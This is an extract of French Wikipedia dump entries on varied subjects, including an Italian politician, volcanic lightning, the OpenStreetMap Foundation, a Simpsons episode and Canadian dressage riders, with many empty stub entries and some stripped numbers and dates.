Le Marché fait partie d'un complexe architectural et paysager comprenant une superficie de , avec un certain nombre de bâtiments historiques, dont le Marché du Fer, le Marché de la Viande, la Place de l'Horloge, les Docks, la Foire de l'Açai, la Ladeira do Castelo et le Solar da Beira et la Place du Pêcheur. L'ensemble fut classée monument historique par l'IPHAN en 1977.

</doc>
<doc id="9623950" url="https://fr.wikipedia.org/wiki?curid=9623950" title="Seagrove">
Seagrove

 est une ville américaine située dans le comté de Randolph dans l'État de Caroline du Nord. Sa population s’élevait à lors du recensement de 2010.

</doc>
<doc id="9623952" url="https://fr.wikipedia.org/wiki?curid=9623952" title="Wrestle Kingdom 10">
Wrestle Kingdom 10



</doc>
<doc id="9623953" url="https://fr.wikipedia.org/wiki?curid=9623953" title="Sicherungs-Regiment 1000">
Sicherungs-Regiment 1000



</doc>
<doc id="9623955" url="https://fr.wikipedia.org/wiki?curid=9623955" title="Falcone Lucifero">
Falcone Lucifero

Falcone Lucifero, né le à Crotone et mort le à Rome, est un homme politique italien.
Biographie.
Falcone Lucifero est le fils de l'historien, botaniste et numismate Armando Lucifero (1855-1933), frère du marquis d'Aprigliano (aujourd'hui "Apriglianello"), et d'Antonietta di Francia. Il est leur sixième enfant et appartient donc à la famille Lucifero de Crotone.
Falcone Lucifero participe à la Première Guerre mondiale en tant qu'officier avant d'aller à l'université à Turin, dans le nord de l'Italie, où il obtient un diplôme en jurisprudence.
En 1920, il est élu conseiller communal de la ville de Crotone, chef-lieu de la province du même nom, en tant que membre du Parti socialiste unitaire. Il est alors très proche du courant socialiste réformiste mené par Filippo Turati mais il s'en détache ensuite et s'inscrit au Parti national fasciste. Toutefois, après l'arrivée au pouvoir de Benito Mussolini et du parti fasciste, il désapprouve finalement l'idéologie et se retire de la vie politique pour exercer la profession d'avocat.
Le , après la chute du régime fasciste et la libération de l'Italie par les troupes américaines, Falcone Lucifero est nommé préfet de la province de Catanzaro puis préfet de la province de Bari. Du 11 février au 22 avril 1944, il est également promu au poste de ministre de l'Agriculture.
Le , il est nommé ministre de la Maison Royale, d'abord au service du roi Victor-Emmanuel III puis d'Humbert II, dernier roi d'Italie, jusqu'à la mort de celui-ci en exil, en 1983, en Suisse.
Falcone Lucifero est mort à Rome le à l'âge de 99 ans.
Le poète est sculpteur Alfredo Lucifero est son neveu.

</doc>
<doc id="9623957" url="https://fr.wikipedia.org/wiki?curid=9623957" title="Pippo De Nobili">
Pippo De Nobili



</doc>
<doc id="9623975" url="https://fr.wikipedia.org/wiki?curid=9623975" title="2016 en catch">
2016 en catch

Chronologie du catch
Cet article présente les faits marquants de l'année 2016 en catch.
Autres évènements.
Janvier.
21 janvier : Le ' décerne ses prix et distinctions annuels. A.J. Styles a été élu comme le catcheur de l'année 2015. Il a également reçu le prix du catcheur ayant fait le plus de matchs de qualité. Les Young Bucks, quant à eux, ont été choisis pour incarner, comme en 2014, l'équipe de l'année. Chad Gable a reçu le prix du ' de l'année 2015.
Février.
8 février : Daniel Bryan annonce sa retraite des rings avancée par ses blessures antérieures et ses désaccords avec la World Wrestling Entertainment.
Avril.
Trente-deuxième édition de "WrestleMania"

</doc>
<doc id="9623979" url="https://fr.wikipedia.org/wiki?curid=9623979" title="Cristian Manea">
Cristian Manea

Cristian Marian Manea, né le à Agigea, est un footballeur international jouant au CFR Cluj.
Carrière.
En club.
Né à Constanța, Cristian Manea fait ses débuts professionnels avec son club formateur, le FC Viitorul Constanța, durant la saison 2013-2014.
Après 35 matchs avec le Viitorul Constanța et sa première sélection internationale, on annonce son transfert pour Chelsea en juin 2015, pour une somme d'environ trois millions d'euros mais en réalité, c'est une supercherie, il ne fut jamais transféré à Chelsea mais au club chypriote de l'Apollon Limassol. À la fin du mois d'août, il est prêté en Belgique au Royal Mouscron-Péruwelz pour gagner du temps de jeu. 
En février 2016, Cristian Manea a été élu par le journal espagnol Marca comme l'un des 11 joueurs les plus talentueux de sa génération.
En sélection nationale.
Il reçoit sa première sélection en équipe de Roumanie le 31 mai 2014, lors d'un match amical face à l'Albanie. Âgé de 16 ans, 9 mois et 22 jours, il devient le plus jeune joueur roumain de l'histoire à débuter en équipe nationale, battant le record de Grațian Sepi qui datait de 1928.

</doc>
<doc id="9623987" url="https://fr.wikipedia.org/wiki?curid=9623987" title="Troxochrota scabra">
Troxochrota scabra

Troxochrota scabra, unique représentant du genre Troxochrota, est une espèce d'araignées aranéomorphes de la famille des Linyphiidae.
Distribution.
Cette espèce se rencontre en Scandinavie, en Estonie, en Russie, en Roumanie, en Suisse et en Allemagne.
Description.
Le mâle mesure et la femelle .
Systématique et taxinomie.
Cette espèce a été décrite par Kulczyński en 1894.
"Cnephalocotes pectinatus" a été placée en synonymie par Lehtinen, Koponen et Saaristo en 1979.
Ce genre a été décrit par Kulczyński en 1894.

</doc>
<doc id="9623991" url="https://fr.wikipedia.org/wiki?curid=9623991" title="Cnephalocotes pectinatus">
Cnephalocotes pectinatus



</doc>
<doc id="9623995" url="https://fr.wikipedia.org/wiki?curid=9623995" title="Croix de l'ancien cimetière de Beaulandais">
Croix de l'ancien cimetière de Beaulandais

La croix de l'ancien cimetière de Beaulandais est une croix de cimetière située sur le territoire de la commune de Juvigny Val d'Andaine, en France.
Localisation.
La croix est située dans le département de l'Orne, à l'ouest de l'église Saint-Étienne de Beaulandais, commune déléguée de Juvigny Val d'Andaine, à l'endroit de l'ancien cimetière.
Historique.
La croix est datée de 1628. Elle est inscrite au titre des monuments historiques depuis le .

</doc>
<doc id="9624011" url="https://fr.wikipedia.org/wiki?curid=9624011" title="François de Visdelou">
François de Visdelou

 François de Visdelou (né vers 1615 et mort le à Saint-Pol-de-Léon) est un ecclésiastique qui fut évêque de Léon de 1662 à 1668.
Biographie.
François Visdelou ou de Visdelou est le fils de Gilles Visdelou, seigneur de la Goublaye, et de Françoise du Quélennec, dame de Bienassis. Né vers 1615 il commence ses études au collège de La Flèche où il s'initie à la théologie et les continue à Paris. Il est licencié In utroque jure. Ordonné prêtre en 1642 il dessert plusieurs paroisses. Chanoine et grand chantre de la cathédrale Saint-Corentin de Quimper puis vicaire général du diocèse il est également à Paris, prédicateur de la reine Anne d'Autriche.
Député aux États de Bretagne, il est nommé le coadjuteur de l'évêque René du Louët avec le titre d'évêque titulaire de Madaure en Numidie et consacré en mai par Anthyme-Denis Cohon, évêque de Dol. Il est désigné en 1662 et confirmé le pour l'évêché de Léon. Il meurt après cinq ans d'épiscopat le et est inhumé dans le chœur de la cathédrale Saint-Paul-Aurélien de Saint-Pol-de-Léon où se trouve toujours son tombeau en marbre blanc, surmonté d'une statue réaliste du prélat à demi allongé s'appuyant sur un bras, sculptée par Nicolas de la Colonge en 1711 .

</doc>
<doc id="9624021" url="https://fr.wikipedia.org/wiki?curid=9624021" title="Roue Stevan">
Roue Stevan



</doc>
<doc id="9624023" url="https://fr.wikipedia.org/wiki?curid=9624023" title="Bram van der Stok">
Bram van der Stok

Bram van der Stok est un pilote de chasse et un historien néerlandais.
Biographie.
Il est né le à Pladju, à Sumatra, aux Indes néerlandaises. Il grandit à Sumatra et part faire son lycée en Suisse. En 1934, il s'inscrit en faculté de médecine à l'université de Leyde. S'intéressant beaucoup aux sports universitaires - il pratique notamment l'aviron et le hockey sur glace - et à l'aviation, il décide en 1937, après avoir consulté son père, de suivre une formation de pilote militaire à la base aérienne de Soesterberg, où il devient officier-pilote de réserve. Après sa formation de pilote, il reprend ses études de médecine à l'université d'Utrecht.
En mai 1940, lors de la Seconde Guerre mondiale il abat son premier Messerschmitt Bf 109. En 1941, il réussit à quitter les Pays-Bas et rejoint l'Écosse. Il rejoint la Royal Air Force et entre 1942 à 1943 il abat six avions de la Luftwaffe.
Le 12 avril 1942, son Spitfire est abattu au-dessus de la France, il est arrêté à Saint-Omer. Il est envoyé au camp Stalag Luft III. Le 24 mars 1944 il s'évade du camp lors de « la Grande Évasion » , il est le des 76 prisonniers à s'évader. Il marche jusqu'à Utrecht et rejoint la résistance belge. Avec deux officiers américains, ils traversent la France et arrivent en Espagne. Il atteint Gibraltar le 8 juillet 1944 et retourne à Bristol le 11 juillet 1944. Il reprend un Spitfire dans l'escadron 91. En 1945 il apprend que ses deux frères sont morts en camp de concentration et son père a été assassiné par la Gestapo.
En 1951, il devient médecin à l'université d'Utrecht et émigre aux États-Unis. Après une formation de gynécologue à l’Uuniversité de Syracuse, il exerce au Nouveau-Mexique puis travaille pour la NASA à Huntsville (Alabama).
Il décède le à Virginia Beach en Virginie, aux États-Unis.
Il est le militaire néerlandais le plus décoré de l'histoire du royaume.

</doc>
<doc id="9624032" url="https://fr.wikipedia.org/wiki?curid=9624032" title="Fondation OpenStreetMap">
Fondation OpenStreetMap

 (OSMF) est une « société limitée par garantie », enregistrée en Angleterre et pays de Galles depuis le .
C'est une fondation à but non lucratif dont l'objectif est de soutenir et d'encourager le développement de données géo-spatiales librement réutilisables. Comme le nom le suggère, elle soutient principalement le fonctionnement continu et la croissance du projet OpenStreetMap, mais cela ne l’empêche pas de soutenir d'autres projets.
Objectif.
La Fondation agit comme entité juridique pour le projet OpenStreetMap. Elle est également dépositaire des serveurs informatiques et des services nécessaires pour l'accueillir.
OSMF est un outil de collecte de fonds pour soutenir le projet. La Fondation peut accepter des dons pour le projet OpenStreetMap et allouer ces dons aux activités liées au projet.
Elle organise la conférence annuelle « State-of-the-map » .
Structure.
OSMF est une organisation de membres, où chaque adhérant à un droit de vote lors d’assemblées générales sur les activités de la fondation. Les membres de l'OSMF n'ont pas de droit de vote sur la manière dont le projet OpenStreetMap opère lui-même, mais seulement sur sa fondation. 
L’adhésion est ouverte à tous sur paiement d'une cotisation annuelle de . Il y a au mois de , 350 membres normaux, 351 membres associés et 18 membres professionnels. Les cinq premières entreprises adhérentes ont été accueillies en .
L'organisation est financée à la fois par les cotisations annuelles mais également par des donations ponctuelles qui peuvent être beaucoup plus importantes.
La fondation est organisée autour d'un conseil d'administration constitué de sept membres.

</doc>
<doc id="9624034" url="https://fr.wikipedia.org/wiki?curid=9624034" title="Peskov">
Peskov

Patronymes.
Peskov ("masculin" ; ) ou Peskova ("féminin" ; ) est un patronyme russe porté par plusieurs personnalités (par ordre alphabétique) :

</doc>
<doc id="9624036" url="https://fr.wikipedia.org/wiki?curid=9624036" title="Orage volcanique">
Orage volcanique

Un orage volcanique est un phénomène de décharge électrique observé dans un panache volcanique ou à sa périphérie. Ces panaches de poussière et/ou de gaz se chargent électriquement, produisant souvent des éclairs spectaculaires. Une hypothèse est que ces décharges (qui existent sur d'autres planètes) pourraient sur Terre avoir participé à la production de molécules complexes, voire à l'apparition de la vie.
L'apparition de la foudre demande des conditions particulières de différence de potentiel électrique qui ne sont pas toujours présentes au cours d'une éruption. Toutes les éruptions ne génèrent donc pas ce phénomène.
Selon une hypothèse récente (2019) ces éclairs pourraient être dus à la présence de radon naturellement radioactif et ionisant dans le panache. Antérieurement on pensait que c'est l'électricité statique dégagée par le frottement des particules qui produisait ces éclairs.
Formation.
Elle est longtemps restée mystérieuse, notamment parce que l'accès à l'intérieur du panache est éminemment dangereux pour les chercheurs, et délicat pour des engins motorisés ; l'étude fine en profil vertical des propriétés physicochimiques et de charge, des propriétés thermodynamiques et de la microphysique des particules dans des panaches est donc récente. Elle a été plus facile dans les panaches gazeux par exemple via un ballon instrumenté et pourrait être facilité par l'utilisation de drones.
Occurrences.
Le phénomène, relativement fréquent, s'est manifesté à plusieurs reprises et a été noté depuis fort longtemps. Ci-dessous, quelques cas récents :
Enjeu de connaissance scientifique.
Les particules chargées (dont celles qui auraient été ionisées par un accident nucléaire) n'ont pas le même comportement dans l'atmosphère que leurs homologues non chargées ; 
L'intérêt pour l'électricité dans le panache volcanique a été relancé quand on a remarqué que les nuages d'aérosols chargés (dont font partie les panaches volcaniques et certains nuages de poussière) ne répondaient pas aux modèles classiques de transport de particules à longue portée : les modèles existants ne prédisent que très imparfaitement le transport de particules chargées et de grosses particules (Ryder et al., 2013 ; van der Does et al., 2018 ; Weinzierl et al., 2017).
La charge modifie la vitesse de chute des petites particules dans le champ électrique atmosphérique, et elle affecte les taux d'agrégation qui produisent des particules plus lourdes (en améliorant et le lessivage du panache par les précipitations s'il y en a. La charge peut aussi prolonger le transport de particules dans des champs électriques importants.
Comprendre ces phénomènes est donc important pour la modélisation des panaches et des retombées.
Les orages volcaniques et l'origine de la vie.
Il est possible que les orages volcaniques aient joué un rôle majeur dans le développement de la vie primitive, en permettant la fixation de l'azote atmosphérique au sein de molécules organiques. L'azote joue un rôle fondamental dans les organismes vivants, étant un élément essentiel des protéines et des acides nucléiques. Aujourd'hui sa fixation est assurée par les algues et certaines bactéries , mais aux débuts de la vie il a fallu un mécanisme . Vu l'énergie de la liaison N≡N du diazote, le seul mécanisme connu dans l'environnement terrestre comme capable de la casser (et permettre ainsi à l'azote de se lier à d'autres éléments comme le carbone C et l'hydrogène H) est l'action de la foudre, et particulièrement des éclairs se produisant dans les orages volcaniques, au sein desquels se trouvent des gaz et des cendres susceptibles de se combiner à l'azote monoatomique provenant de la dissociation des molécules N. Les traces d'azote fixé abiotiquement ont longtemps manqué, tant dans les formations géologiques que dans les éruptions observées, en raison sans doute de la grande mobilité des nitrates (les principaux composés azotés formés directement) en présence d'eau, mais en 2023 des concentrations importantes de nitrates ont été trouvées en milieu aride dans des dépôts volcaniques de Turquie et du Pérou, et leur origine atmosphérique attestée par leur enrichissement en oxygène 17 (O). Le volume des dépôts et leur concentration en azote a permis d'évaluer quantitativement l'efficacité de ce mécanisme de fixation : jusqu'à (282 millions de tonnes) d'azote au cours d'une seule éruption, autant que la production annuelle d'une usine de fertilisants typique.

</doc>
<doc id="9624039" url="https://fr.wikipedia.org/wiki?curid=9624039" title="Seagrove (Caroline du Nord)">
Seagrove (Caroline du Nord)



</doc>
<doc id="9624040" url="https://fr.wikipedia.org/wiki?curid=9624040" title="Besiyata Dishmaya">
Besiyata Dishmaya

Besiyata Dishmaya (judéo-araméen: בסיעתא דשמיא "Bé-Siyata Dishmaya" « avec l’aide des Cieux ») est une expression de piété juive signifiant « avec l'aide de Dieu, » équivalant au latin "Deo juvante" et à l'arabe "bieawn Allah" (), et préférée à l'expression hébraïque "Be'ezrat HaShem" (hébreu: בעזרת השם "Bé-ézrate Hashem" « avec l’aide du Nom » i.e. Dieu), plus littérale car son acronyme BS"D, retranscrit en caractères hébraïques , ne comprend aucune des lettres du nom divin. Cet acronyme est en usage dans les lettres, correspondances, notes et la plupart des documents écrits par des juifs croyants, afin de rappeler que tout vient de Dieu, y compris le document en question, et que rien ne peut réussir sans son aide. Cette coutume n’est requise par aucun code de loi juive mais elle est considérée comme une institution ancienne qu’il ne convient pas d’abroger.
Historique.
La coutume de mentionner l’assistance divine en entête est d’institution récente, et le rabbin Yossef Qafih défend l’usage yéménite de l’omettre en arguant que ces entêtes ne figurent dans aucun des nombreux responsa exhumés dans les guenizot ; lui-même pense pouvoir en situer l’apparition en Europe de l’Est au . En revanche, des entêtes équivalent comme "Beʿezrat Hashem" (Bʿ"H) ou "Beʿezrat Hashem Yitbaraḥ" (BʿzHy"t) sont attestés quatre siècles plus tôt, car le rabbin Isaac Caro recommande de les inclure dans les lettres de recommandation, d’approbation ou de transaction afin de se conformer au verset « Dans toutes tes voies, connais-le, et il aplanira ta route » (Proverbes 3:6). L’adoption du sigle BS"D semble résulter d’une répugnance de la part d’une partie des décisionnaires ès lois juives à banaliser par ces entêtes l’emploi de la lettre Hé car elle figure dans le nom divin de quatre lettres, que l’on a décrété ineffable puis ineffaçable.

</doc>
<doc id="9624045" url="https://fr.wikipedia.org/wiki?curid=9624045" title="Peskova">
Peskova



</doc>
<doc id="9624047" url="https://fr.wikipedia.org/wiki?curid=9624047" title="Gélimir">
Gélimir



</doc>
<doc id="9624048" url="https://fr.wikipedia.org/wiki?curid=9624048" title="Chleuh (argot)">
Chleuh (argot)

En argot, le terme chleuh est un sobriquet appliqué successivement :
Étymologie.
À l’origine, est le nom d’une tribu berbère du Maroc et de sa langue.
Argot français.
D'après Gaston Esnault, le mot « chleuh » a été employé, pendant la Première Guerre mondiale, par les soldats combattant au Maroc, pour désigner un soldat de l'armée territoriale. Cet emploi a été introduit en France métropolitaine, vers 1933, par des soldats ayant combattu au Maroc.
D'après Albert Dauzat, « chleuh » a été employé en France, vers 1936, pour désigner un frontalier parlant une autre langue que le français, telle que le (franc-)comtois ou l'alsacien.
Le mot est également employé, autour de la Seconde Guerre mondiale, pour désigner de manière péjorative les Allemands. L'humoriste et résistant Pierre Dac en fait ainsi usage dans sa chanson "J'vais m'faire Chleuh !" :
Pierre Dac reprenait un usage de l'armée française qui avait dû affronter une vive résistance des combattants marocains (cette « pacification » ne s'est achevée qu'en 1934).
Le mot est alors synonyme de "Boches". L'origine en remonte à l'installation du protectorat français au Maroc en 1912, face à la rivalité allemande : 
Argot israélien.
D'après Daniel J. Schroeter, le mot « chleuh » a également été transmis en Israël par les immigrants juifs du Maroc et le terme signifie « simplet » en argot israélien.

</doc>
<doc id="9624050" url="https://fr.wikipedia.org/wiki?curid=9624050" title="Parti de l'unité nationale (Chypre)">
Parti de l'unité nationale (Chypre)



</doc>
<doc id="9624054" url="https://fr.wikipedia.org/wiki?curid=9624054" title="Primakov">
Primakov

Patronymes.
Primakov ("masculin" ; ) ou Primakova ("féminin" ; ) est un patronyme russe porté par plusieurs personnalités (par ordre alphabétique) :

</doc>
<doc id="9624059" url="https://fr.wikipedia.org/wiki?curid=9624059" title="Liste des guerres de l'Argentine">
Liste des guerres de l'Argentine

Cette liste regroupe les guerres et conflits ayant eu lieu sur l'actuel territoire argentin ou ayant vu la participation de l'Argentine sous ses différentes entités.

</doc>
<doc id="9624060" url="https://fr.wikipedia.org/wiki?curid=9624060" title="Liste des sommets ultra-proéminents du Canada">
Liste des sommets ultra-proéminents du Canada



</doc>
<doc id="9624061" url="https://fr.wikipedia.org/wiki?curid=9624061" title="Mikhaïl Kotsioubinski">
Mikhaïl Kotsioubinski



</doc>
<doc id="9624064" url="https://fr.wikipedia.org/wiki?curid=9624064" title="Le Botaniste françois">
Le Botaniste françois

Le botaniste françois est un ouvrage de botanique de Jacques Barbeu du Bourg. Le Botaniste français parait à Paris en 1767, en deux volumes, précédés d'une dédicace à Madame du Bourg. Barbeu y suit la "méthode naturelle" et décrit les plantes des environs de Paris. Destiné aux étudiants et surtout aux herboristes, Barbeu du Bourg y décrit l’usage médicinal des différentes espèces. Il est le premier à abandonner le latin pour nommer et à décrire les plantes en français, innovation qui sera bientôt reprise par de nombreux auteurs. 
Analyse.
Jean-Jacques Rousseau reprochera à Barbeu d'être imaginatif. Pour Louis-Marie Aubert du Petit-Thouars, "On n'y trouve, aucune découverte, mais celles qui ont été faites précédemment y sont mises en œuvre d'une manière exacte et très habile.". Pour l'abbé Angot, l'ouvrage n'est pourtant qu'une œuvre de vulgarisation, sans idées personnelles, sauf un essai de classification qui tient le milieu entre les systèmes artificiels et la méthode naturelle.
Méthode naturelle.
Barbeu apparaît comme un des premiers propagateurs de la "méthode naturelle", en ne suivant pas la classification de Carl von Linné. La méthode naturelle est énoncée et développée par Michel Adanson dans ses "Familles des plantes", en 1763. Barbeu ne nomme pas Adanson, qui avait été nommé censeur de l'ouvrage. Ce dernier s'en froissa, et Barbeu demanda et obtint un autre censeur.
Description.
Les premiers chapitres de ce travail contiennent un exposé succinct des éléments de la botanique : la fleur, la feuille, la tige, la racine, sont successivement passées en revue, et leur étude est éclairée par des comparaisons dans un style imagé et fleuri: "On peut regarder la fleur, comme le lit nuptial de la plante; les pétales en sont les rideaux, le calicule la housse, l'étamine et le pistil sont l'époux et l'épouse, et le réceptacle est la couchette. » A propos des plantes parasites, il s'écrie : « Nous ne voyons parmi les hommes rien qui ressemble au guy ni à l'orobanche; mais que d'agarics et de cuscutes!".
Viennent ensuite trois "Lettres à M*** sur l'application de la botanique à la médecine", elles sont émaillées de réflexions sur la nécessité de surveiller l'instruction et le commerce des herboristes, puis quelques "Avis sur la récolte y la dessiccation et la conservation des simples", le "Catalogue d'un jardin de plantes usuelles par classes et familles", et un "Index alphabeticus plantarum agro Parisiensi sponte innascentium". 
Le deuxième volume, intitulé "le Botaniste françois ou Manuel d'herborisation, contient la liste des plantes de la flore parisienne, rangées par classes, familles, genres, espèces et variétés", le tout décrit en français.
La classification effectuée par Barbeu, comprend en somme six classes, subdivisées en trente-sept sections ou familles. Leur agencement rappelle assez bien les grandes lignes du système de Joseph Pitton de Tournefort. Les familles sont naturelles pour la plupart, sauf les sections dites "à reconfronter" où Barbeu se débarrasse de toutes les plantes qu'il n'a pu ranger dans les précédentes. 
Les genres sont également des genres naturels. La nomenclature des espèces et des variétés n'est pas très rigoureuse : Lorsque Barbeu donne des noms latins, il prend les noms génériques classiques ; mais dans le "Manuel d'herborisation y fait pour les commençants", il francise et les noms génériques et les noms spécifiques, ou les remplace par le sobriquet populaire, ou les crée de toutes pièces.

</doc>
<doc id="9624065" url="https://fr.wikipedia.org/wiki?curid=9624065" title="Kotsioubinski">
Kotsioubinski



</doc>
<doc id="9624075" url="https://fr.wikipedia.org/wiki?curid=9624075" title="Pirogov">
Pirogov



</doc>
<doc id="9624083" url="https://fr.wikipedia.org/wiki?curid=9624083" title="Les Chemins de la gloire (Les Simpson)">
Les Chemins de la gloire (Les Simpson)

Les Chemins de la gloire est le huitième épisode de la vingt-septième saison de la série télévisée "Les Simpson" et le de la série. Il est sorti en première sur le réseau Fox le .
Synopsis.
Lisa perd un concours d'inventions. En explorant avec Bart un asile abandonné, elle découvre un document ayant appartenu à la première inventrice de Springfield : Amelia Vanderbuckle. Cette dernière est à l'origine de plusieurs créations dont certaines, aux conséquences terribles, lui ont valu de finir sa vie internée, tout en poursuivant malgré tout ses travaux. Lisa veut alors prouver qu'Amelia mérite de figurer parmi les plus grandes inventrices de l'Histoire en retrouvant sa toute dernière invention. 
De son côté, Bart met la main sur un journal qui appartenait à un sociopathe et fait semblant d'en être l'auteur. Quand le chef Wiggum en informe la famille, Homer et Marge, inquiets, donnent à leur fils un test à remplir pour en avoir le cœur net. Furieux, Bart fait exprès de répondre n'importe quoi. Ses parents pensent alors qu'il est vraiment un sociopathe et satisfont ses quatre volontés jusqu'à ce qu'il soit emmené dans un établissement spécialisé. Rongé par les remords, Bart est bien décidé à prouver qu'il est sain d'esprit...
Réception.
Lors de sa première diffusion l'épisode a attiré .

</doc>
<doc id="9624097" url="https://fr.wikipedia.org/wiki?curid=9624097" title="Dogs of War (album de Saxon)">
Dogs of War (album de Saxon)

Dogs of War est le album studio du groupe britannique Saxon, sorti le 14 août 1995.
Dernier album avec Graham Oliver, un des fondateurs du groupe. Avec "Dogs of War", Saxon atteint une certaine stabilité musicale, d'oû se dégage une puissance "metal" perdue après "Denim and Leather" et retrouvée au fil des ans pour aboutir à ce qu'est Saxon maintenant un digne représentant de la NWOBHM... "(Dogs of War, no surrender...)".

</doc>
<doc id="9624098" url="https://fr.wikipedia.org/wiki?curid=9624098" title="Gina Smith">
Gina Smith

Gina Smith, née le à Saskatoon, est une cavalière canadienne de dressage.
Carrière.
Aux Jeux olympiques d'été de 1988 à Séoul, Gina Smith se classe troisième de l'épreuve de dressage par équipe sur le cheval "Malte"; elle termine douzième de l'épreuve individuelle.
Aux Jeux olympiques d'été de 1996 à Atlanta avec "Faust", elle fait partie de l'équipe canadienne de dressage terminant dixième ; elle est de l'épreuve individuelle de dressage.

</doc>
<doc id="9624103" url="https://fr.wikipedia.org/wiki?curid=9624103" title="Eva Maria Pracht">
Eva Maria Pracht

 
Eva Maria Pracht, née le à Wurtzbourg et morte le au Canada, est une cavalière canadienne de dressage.
Biographie.
Carrière sportive.
Aux Jeux olympiques d'été de 1984 à Los Angeles avec "Little Joe", Eva Maria Pracht fait partie de l'équipe canadienne de dressage terminant septième ; elle est de l'épreuve individuelle de dressage.
Elle remporte la médaille d'or par équipe aux Jeux panaméricains de 1987 à Indianapolis.
Aux Jeux olympiques d'été de 1988 à Séoul, elle se classe troisième de l'épreuve de dressage par équipe sur le cheval "Emirage"; elle termine de l'épreuve individuelle.
Famille.
Elle est la fille du cavalier allemand Josef Neckermann et la mère de la cavalière canadienne Martina Pracht.
Décès.
Elle meurt le 15 février 2021 à l'âge de 83 ans des suites de la Covid-19.

</doc>
<doc id="9624104" url="https://fr.wikipedia.org/wiki?curid=9624104" title="Eva Pracht">
Eva Pracht



</doc>
<doc id="9624105" url="https://fr.wikipedia.org/wiki?curid=9624105" title="Bessiyata Dishmaya">
Bessiyata Dishmaya



</doc>
<doc id="9624106" url="https://fr.wikipedia.org/wiki?curid=9624106" title="6e division aéroportée">
6e division aéroportée



</doc>
<doc id="9624107" url="https://fr.wikipedia.org/wiki?curid=9624107" title="Maciste dans les mines du roi Salomon">
Maciste dans les mines du roi Salomon

Maciste dans les mines du roi Salomon ("") est un péplum italien de Piero Regnoli sorti en 1964.
Synopsis.
Dans un pays de légende situé en Afrique, le roi Namar a construit un temple sur le site où se dressaient les mines d'or du roi de Salomon. Afin de maintenir la paix et le calme dans son royaume, il a interdit l'exploitation du minerai. Cette décision déplaît à certains dignitaires du royaume. L'un d'eux, Riad, propose à Fariza, une reine amazone d'une cité voisine une alliance afin de fomenter un coup d'état et de renverser Namar. Le coup d'état réussit et le roi est tué, mais sur les conseils d'Abucar, un homme resté fidèle à Namar, sa petite amie, Samara s'enfuit avec le fils du roi, un enfant nommé Vazma, avec pour mission de prévenir Maciste de la situation. Après plusieurs péripéties, Vazma et Samara trouvent l'hospitalité dans un village de chasseurs. Pendant ce temps Abucar est torturé par Riad et Fariza qui veulent savoir ce qu'est devenu le prince héritier. Les mines ont été rouvertes et sont exploitées par des esclaves à bout de forces. Maciste prévenu de l'évolution de la situation en ville y entre au moment où Abucar va être exécuté, il empêche sa mise à mort mais est lui-même capturé à l'aide d'un filet. Condamné à mort par écartèlement, il s'en sort mais après qu'il eut refusé les avances de Fariza, celle-ci l’envoûte en lui entourant la cheville d'un anneau qui lui fait perdre souvenir et volonté et l'envoie travailler aux mines comme esclave. Sur ces entrefaites Riad et Fariza ont retrouvé Samara prise dans une des nombreuses rafles qu'organise le pouvoir pour maintenir son quota d'esclaves aux mines. Refusant de dire ou se trouve le prince héritier, elle est condamnée à recevoir de l'or fondu sur tout le corps. Mais Maciste qui a réussi à se débarrasser de son anneau à la cheville va intervenir à temps.

</doc>
<doc id="9624111" url="https://fr.wikipedia.org/wiki?curid=9624111" title="Afro-American (journal)">
Afro-American (journal)



</doc>
<doc id="9624112" url="https://fr.wikipedia.org/wiki?curid=9624112" title="Gueorgui Vassiliev">
Gueorgui Vassiliev



</doc>
<doc id="9624116" url="https://fr.wikipedia.org/wiki?curid=9624116" title="Cynthia Neale-Ishoy">
Cynthia Neale-Ishoy

Cynthia Margaret Neale-Ishoy, née le à Edmonton, est une cavalière canadienne de dressage.
Carrière.
Aux Jeux olympiques d'été de 1972 à Munich avec "Bonne Année", Cynthia Neale-Ishoy fait partie de l'équipe canadienne de dressage terminant sixième ; elle est de l'épreuve individuelle de dressage.
Elle est médaillée d'or par équipe lors des Jeux panaméricains de 1971 à Cali avec Christilot Hanson-Boylen et Zoltan Sztehlo.
Aux Jeux olympiques d'été de 1988 à Séoul, elle se classe troisième de l'épreuve de dressage par équipe sur le cheval "Dynasty"; elle termine de l'épreuve individuelle.
Aux Jeux olympiques d'été de 1992 à Barcelone avec "Dakar", elle fait partie de l'équipe canadienne de dressage terminant dixième ; elle est de l'épreuve individuelle de dressage. Aux Jeux olympiques d'été de 2004 à Athènes avec "Proton", elle fait partie de l'équipe canadienne de dressage terminant neuvième ; elle est de l'épreuve individuelle de dressage.

</doc>
<doc id="9624117" url="https://fr.wikipedia.org/wiki?curid=9624117" title="Aftenia">
Aftenia



</doc>
<doc id="9624118" url="https://fr.wikipedia.org/wiki?curid=9624118" title="Cynthia Ishoy">
Cynthia Ishoy



</doc>
<doc id="9624121" url="https://fr.wikipedia.org/wiki?curid=9624121" title="Eva-Maria Pracht">
Eva-Maria Pracht



</doc>
<doc id="9624122" url="https://fr.wikipedia.org/wiki?curid=9624122" title="Arany János utca">
Arany János utca

Arany János utca est une rue de Budapest, située dans le quartier de Lipótváros ().

</doc>
<doc id="9624123" url="https://fr.wikipedia.org/wiki?curid=9624123" title="Aranzazu (Caldas)">
Aranzazu (Caldas)



</doc>
<doc id="9624128" url="https://fr.wikipedia.org/wiki?curid=9624128" title="Basilique Sainte-Julie">
Basilique Sainte-Julie



</doc>
<doc id="9624129" url="https://fr.wikipedia.org/wiki?curid=9624129" title="Basilique Sainte-Justine">
Basilique Sainte-Justine



</doc>
<doc id="9624133" url="https://fr.wikipedia.org/wiki?curid=9624133" title="Diego Llorente">
Diego Llorente

Diego Javier Llorente Ríos, né le à Madrid, est un footballeur international espagnol. Il joue au poste de défenseur au Real Betis.
Biographie.
Il participe avec la sélection espagnole des moins de 20 ans à la Coupe du monde des moins de 20 ans 2013 organisée en Turquie. Lors du mondial junior, il joue trois matchs : deux rencontres de phase de poule, contre les États-Unis puis la France, et enfin le huitièmes de finale remporté face au Mexique. L'Espagne atteint les quarts de finale de la compétition, en étant battue par l'Uruguay après prolongation.
Vicente del Bosque le fait débuter en équipe d'Espagne le 29 mai 2016, lors d'un match amical face à la Bosnie (victoire 3 à 1).
En juin 2017, il rejoint la Real Sociedad pour cinq saisons contre une indemnité estimée à six ou sept millions d'euros, le Real Madrid ayant une option de rachat du contrat du joueur pendant trois ans. Avec le club basque, il participe à la Ligue Europa lors de la saison 2017-2018. Il marque trois buts en phase de groupe, avec notamment un doublé face au club norvégien de Rosenborg. Son équipe s'incline en seizièmes de finale face au club autrichien du Red Bull Salzbourg.
